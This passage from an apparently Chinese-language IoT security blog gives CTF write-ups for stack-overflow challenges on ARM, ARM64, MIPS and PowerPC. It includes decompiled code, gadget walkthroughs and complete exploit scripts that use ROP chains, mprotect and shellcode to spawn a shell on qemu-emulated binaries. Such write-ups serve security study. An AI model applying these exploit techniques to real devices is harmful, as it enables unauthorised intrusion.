<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_8D24</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">112</span>]; <span class="comment">// [sp+Ch] [bp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_20AF0(v6, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">  sub_221B0(<span class="number">0</span>, v6, <span class="number">0x200</span>);</span><br><span class="line">  v1 = sub_1F800(a1);</span><br><span class="line">  <span class="keyword">if</span> ( !sub_1F860(a1, v6, v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = sub_1F800(a1);</span><br><span class="line">    <span class="keyword">if</span> ( v2 == sub_1F800(v6) - <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v6[<span class="number">0</span>] == <span class="number">126</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>寻找字符串 <code>exit 0</code> 可以定位到 <code>system</code> 函数。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_110B4(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  if ( a1 )</span><br><span class="line">    return sub_10BA8(a1);</span><br><span class="line">  else</span><br><span class="line">    return sub_10BA8(&quot;exit 0&quot;) == 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>计算溢出大小，r2保留的读入地址到pop{R4,R11,PC}时PC的位置的距离。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/image-20240327181737638.png"
                      alt="image-20240327181737638"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/image-20240327182240060.png"
                      alt="image-20240327182240060"
                ></p>
<p>断点到栈溢出返回时的 POP {R4,R11,PC} 指令。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00008DE8                 POP     &#123;R4,R11,PC&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/image-20240327181558615.png"
                      alt="image-20240327181558615"
                ></p>
<p>解题脚本：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">context.binary = filename</span><br><span class="line">context.arch=<span class="string">&quot;arm&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">*addrs</span>):</span><br><span class="line">    bps = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> addrs:</span><br><span class="line">        bps += <span class="string">f&quot;-ex &#x27;b * <span class="subst">&#123;<span class="built_in">hex</span>(x)&#125;</span>&#x27;&quot;</span></span><br><span class="line">    os.system(<span class="string">f&quot;tmux splitw -h \&quot;gdb-multiarch <span class="subst">&#123;filename&#125;</span> -q -ex &#x27;target remote 127.0.0.1:8888&#x27; <span class="subst">&#123;bps&#125;</span>\&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = <span class="number">0x6c384</span></span><br><span class="line">gadget_addr = <span class="number">0x20904</span> <span class="comment"># pop &#123;r0, r4, pc&#125;;</span></span><br><span class="line">system_addr = <span class="number">0x110B4</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>, gadget_addr, bin_sh_addr, <span class="number">0</span>, system_addr])</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&quot;qemu-arm-static&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;8888&quot;</span>, filename])</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">debug(<span class="number">0x8D5C</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="ARM64-PWN"><a href="#ARM64-PWN" class="headerlink" title="ARM64 PWN"></a>ARM64 PWN</h2><h3 id="Stack-1"><a href="#Stack-1" class="headerlink" title="Stack"></a>Stack</h3><h4 id="baby-arm"><a href="#baby-arm" class="headerlink" title="baby_arm"></a>baby_arm</h4><p>程序开了 NX 保护，并且提供了 <code>mprotect</code>，但如果在 qemu 中运行的话是可以直接 <code>ret2shellcode</code> 的，</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> v3; <span class="comment">// x0</span></span><br><span class="line"></span><br><span class="line">  sub_400760(a1, a2, a3);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Name:&quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">  v3 = read(<span class="number">0</span>, &amp;unk_411068, <span class="number">0x200</span>uLL);</span><br><span class="line">  sub_4007F0(v3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">sub_4007F0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [xsp+10h] [xbp+10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;v1, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>虽然 qemu 中的地址都是可以执行的，但为了熟悉指令，本题可以使用 <code>ret2csu</code>。<code>gadget</code>位于函数 <code>init()</code> 中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">; gadget 1 :</span><br><span class="line">.text:00000000004008CC   LDP   X19, X20, [SP,#0x10] ; 将sp+0x10处数据给x19，sp+0x18处数据给x20</span><br><span class="line">.text:00000000004008D0   LDP   X21, X22, [SP,#0x20] ; 将sp+0x20处数据给x21，sp+0x28处数据给x22</span><br><span class="line">.text:00000000004008D4   LDP   X23, X24, [SP,#0x30] ; 将sp+0x30处数据给x23，sp+0x38处数据给x24</span><br><span class="line">.text:00000000004008D8   LDP   X29, X30, [SP],#0x40 ; 将sp处数据给x29，sp+0x8处数据给x30，并将栈抬高64字节</span><br><span class="line">.text:00000000004008DC   RET   ; 返回x30寄存器中存放的地址</span><br><span class="line"></span><br><span class="line">; gadget 2 :</span><br><span class="line">.text:00000000004008AC   LDR    X3, [X21,X19,LSL#3] ; 将(x21+x19&lt;&lt;3)中的值（地址）赋给x3</span><br><span class="line">.text:00000000004008B0   MOV    X2, X22 ; 将x22寄存器中的值赋给x2（部署3参）</span><br><span class="line">.text:00000000004008B4   MOV    X1, X23 ; 将x23寄存器中的值赋给x1（部署2参）</span><br><span class="line">.text:00000000004008B8   MOV    W0, W24 ; 将w24寄存器中的值赋给w0（部署1参）</span><br><span class="line">.text:00000000004008BC   ADD    X19, X19, #1 ; x19寄存器中的值加一</span><br><span class="line">.text:00000000004008C0   BLR    X3      ; 跳转至x3寄存器中存放的地址</span><br><span class="line">.text:00000000004008C4   CMP    X19, X20 ; 比较x19寄存器与x20寄存器中的值</span><br><span class="line">.text:00000000004008C8   B.NE   loc_4008AC ; 不等则跳转</span><br></pre></td></tr></table></figure></div>

<p>exp如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;aarch64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;qemu-aarch64 -L ./ ./pwn&quot;</span>, shell = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">gadget1_addr = <span class="number">0x4008CC</span></span><br><span class="line">gadget2_addr = <span class="number">0x4008AC</span></span><br><span class="line">mprotect_addr = <span class="number">0x411068</span></span><br><span class="line">shellcode_addr = <span class="number">0x411070</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    add x0, lr, #20</span></span><br><span class="line"><span class="string">    mov x1, xzr</span></span><br><span class="line"><span class="string">    mov x2, xzr</span></span><br><span class="line"><span class="string">    mov x8, #221</span></span><br><span class="line"><span class="string">    svc 0</span></span><br><span class="line"><span class="string">    .ascii &quot;/bin/sh\\0&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(elf.plt[<span class="string">&#x27;mprotect&#x27;</span>]) + shellcode</span><br><span class="line">io.sendafter(<span class="string">&quot;Name:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(gadget1_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(gadget2_addr) <span class="comment"># X29 X30 (RET -&gt; X30)  SP += 0x40</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment"># X19 X20 (X19 + 1 == X20)</span></span><br><span class="line">payload += p64(mprotect_addr) + p64(<span class="number">0x7</span>) <span class="comment"># X21(X3 = [X21], BLR X3)  X22(X2)</span></span><br><span class="line">payload += p64(<span class="number">0x1000</span>) + p64(shellcode_addr &amp; <span class="number">0xfff000</span>) <span class="comment"># X23(X1) X24(W0)</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(shellcode_addr) <span class="comment"># X29 X30 (RET -&gt; X30)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<p>执行顺序：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/image-20240402193406756.png"
                      alt="image-20240402193406756"
                ></p>
<ul>
<li>填充 <code>&#39;a&#39;*0x48</code>，返回 <code>main</code> 函数后，sp会加0x50（因为分配了0x50大小的栈空间），<code>sp-&gt;gadget1</code>，main函数在返回时会被劫持执行流。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/image-20240402192021593.png"
                      alt="image-20240402192021593"
                ></p>
<ul>
<li><p><code>ldp x29, lr, [sp], #0x10</code> 将 sp 弹给 x29，将 sp + 0x8 弹给 lr 寄存器，然后将 sp+0x10。</p>
</li>
<li><p>ret 跳到 lr 寄存器保存的地址处执行，即 <code>gadget1</code>，会将 sp+8处的值赋给 lr，即<code>gadget2</code>，并且此时 <code>x19-&gt;10, x20-&gt;1, x21-&gt;mprotect, x22-&gt;0x7, x23-&gt;0x1000, x24-&gt;shellcode_addr &amp; 0xfff000</code>。</p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/image-20240402194545108.png"
                      alt="image-20240402194545108"
                ></p>
<ul>
<li>然后执行<code>gadget2</code>，结合<code>gadget1</code>给寄存器的赋值，此时 <code>x3-&gt;(x21+x19&lt;&lt;3)-&gt;x21-&gt;mprotect, x2-&gt;x22-&gt;0x7, x1-&gt;x23-&gt;0x1000, w0-&gt;w24-&gt;shellcode_addr, x19-&gt;0+1, exec mprotect, if(*x19==*x20) ret; else loop gadget2;</code>。</li>
<li>然后再次执行<code>gadget1</code>，将<code>shellcode_addr</code> 赋值给 lr 寄存器，完成利用。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/image-20240402195444586.png"
                      alt="image-20240402195444586"
                ></p>
<h2 id="MIPS-PWN"><a href="#MIPS-PWN" class="headerlink" title="MIPS PWN"></a>MIPS PWN</h2><h3 id="Stack-2"><a href="#Stack-2" class="headerlink" title="Stack"></a>Stack</h3><h4 id="axb-2019-mips"><a href="#axb-2019-mips" class="headerlink" title="axb_2019_mips"></a>axb_2019_mips</h4><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">❯ checksec pwn2</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/MIPS_pwn/pwn/pwn2&#x27;</span></span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div>

<p><code>mipsel</code>架构，保护全关。运行发现需要链接<code>uclibc</code>。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">24</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0u</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to MIPS pwn!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v4, <span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello!, %s&quot;</span>, v4);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">32</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, v1, <span class="number">0x200</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>IDA反汇编发现存在栈溢出漏洞。并且发生溢出的函数是非叶子函数。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.text:004007C4                 .globl vuln</span><br><span class="line">.text:004007C4 vuln:                                    # CODE XREF: main+120↓p</span><br><span class="line">.text:004007C4</span><br><span class="line">.text:004007C4 var_28          = -0x28</span><br><span class="line">.text:004007C4 var_20          = -0x20</span><br><span class="line">.text:004007C4 var_s0          =  0</span><br><span class="line">.text:004007C4 var_s4          =  4</span><br><span class="line">.text:004007C4</span><br><span class="line">.text:004007C4                 addiu   $sp, -0x40</span><br><span class="line">.text:004007C8                 sw      $ra, 0x38+var_s4($sp)</span><br><span class="line">.text:004007CC                 sw      $fp, 0x38+var_s0($sp)</span><br><span class="line">.text:004007D0                 move    $fp, $sp</span><br><span class="line">.text:004007D4                 li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)</span><br><span class="line">.text:004007DC                 sw      $gp, 0x38+var_28($sp)</span><br><span class="line">.text:004007E0                 li      $a2, 0x200       # nbytes</span><br><span class="line">.text:004007E4                 addiu   $v0, $fp, 0x38+var_20; 后两个参数可控，从而$v0可控</span><br><span class="line">.text:004007E8                 move    $a1, $v0         # buf</span><br><span class="line">.text:004007EC                 move    $a0, $zero       # fd</span><br><span class="line">.text:004007F0                 la      $v0, read</span><br><span class="line">.text:004007F4                 move    $t9, $v0</span><br><span class="line">.text:004007F8                 jalr    $t9 ; read</span><br><span class="line">.text:004007FC                 nop</span><br><span class="line">.text:00400800                 lw      $gp, 0x38+var_28($fp)</span><br><span class="line">.text:00400804                 nop</span><br><span class="line">.text:00400808                 move    $sp, $fp</span><br><span class="line">.text:0040080C                 lw      $ra, 0x38+var_s4($sp)</span><br><span class="line">.text:00400810                 lw      $fp, 0x38+var_s0($sp); fp溢出返回被覆盖</span><br><span class="line">.text:00400814                 addiu   $sp, 0x40</span><br><span class="line">.text:00400818                 jr      $ra</span><br><span class="line">.text:0040081C                 nop</span><br></pre></td></tr></table></figure></div>

<p><code>$fp</code>寄存器的值，在我们溢出后函数结束时，就会被栈里的值覆盖，因此<code>$fp</code>可控，从而<code>$v0</code>可控，从而<code>$a1</code>可控。而<code>$a0</code>、<code>$a2</code>也在代码里控制住了。因此,我们让<code>$a1</code>指向bss段，从而可以向bss段输入shellcode。当read结束后, <code>move  $sp, $fp</code>指令会使得栈发生迁移，我们在bss段的shellcode前面放置shellcode的地址，这样shellcode的地址就会被放入到<code>$ra</code>寄存器，进而可以ret到shellcode。执行shellcode。exp如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;mips&#x27;</span></span><br><span class="line">context.endian=<span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = process([<span class="string">&quot;qemu-mipsel&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;./lib&quot;</span>, <span class="string">&quot;./pwn2&quot;</span>])</span><br><span class="line"><span class="comment">#r = remote(&#x27;node5.buuoj.cn&#x27;,28044)</span></span><br><span class="line">bss = <span class="number">0x410b70</span></span><br><span class="line">read_addr = <span class="number">0x4007e0</span></span><br><span class="line">r.sendafter(<span class="string">b&quot;What&#x27;s your name:&quot;</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.linux.sh())</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>, bss + <span class="number">0x200</span> - <span class="number">0x40</span> + <span class="number">0x28</span>, read_addr])</span><br><span class="line">r.send(payload)</span><br><span class="line">pause()</span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x24</span>, bss + <span class="number">0x200</span> + <span class="number">0x28</span>, shellcode])</span><br><span class="line">r.send(payload)</span><br><span class="line">pause()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="PPC-PWN"><a href="#PPC-PWN" class="headerlink" title="PPC PWN"></a>PPC PWN</h2><h3 id="Stack-3"><a href="#Stack-3" class="headerlink" title="Stack"></a>Stack</h3><h4 id="UTCTF2019-PPC"><a href="#UTCTF2019-PPC" class="headerlink" title="UTCTF2019 PPC"></a>UTCTF2019 PPC</h4><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">❯ file ppc                </span><br><span class="line">ppc: ELF 64-bit LSB executable, 64-bit PowerPC or cisco 7500, OpenPOWER ELF V2 ABI, version 1 (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=088a76917833cbf23f8b0476d6a52c4ea4701ee7, not stripped</span><br><span class="line">❯ checksec  ppc </span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/PPC_pwn/pwn/ppc&#x27;</span></span><br><span class="line">    Arch:     powerpc64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x10000000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div>

<p>静态编译的ppc64小端序程序。</p>
<p>IDA反汇编存在溢出漏洞。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [sp+60h] [-20h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [sp+64h] [-1Ch]</span></span><br><span class="line"></span><br><span class="line">  welcome_0();</span><br><span class="line">  get_input_0();</span><br><span class="line">  v5 = strlen_0(buf_0);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">    buf_0[i] ^= <span class="number">0xCB</span>u;</span><br><span class="line">  printf_0(<span class="string">&quot;%d\n&quot;</span>, v5);</span><br><span class="line">  encrypt_0((<span class="type">char</span> *)v5, v3);</span><br><span class="line">  puts_0(<span class="string">&quot;Exiting..&quot;</span>);</span><br><span class="line">  exit_0(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">get_input_0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  puts_0(<span class="string">&quot;Enter a string&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> fgets_0(buf_0, <span class="number">0x3E8</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt_0</span><span class="params">(<span class="type">char</span> *block, <span class="type">int</span> edflag)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD v2[<span class="number">2</span>]; <span class="comment">// [sp+60h] [-90h] BYREF</span></span><br><span class="line">  _DWORD v3[<span class="number">32</span>]; <span class="comment">// [sp+68h] [-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">26</span>] = (_DWORD)block;</span><br><span class="line">  memcpy_0(v3, buf_0, <span class="number">0x3E8</span>uLL); <span class="comment">// 栈溢出</span></span><br><span class="line">  printf_0(<span class="string">&quot;Here&#x27;s your string: &quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( v2[<span class="number">0</span>] = <span class="number">0</span>; v2[<span class="number">0</span>] &lt;= <span class="number">49</span>; ++v2[<span class="number">0</span>] 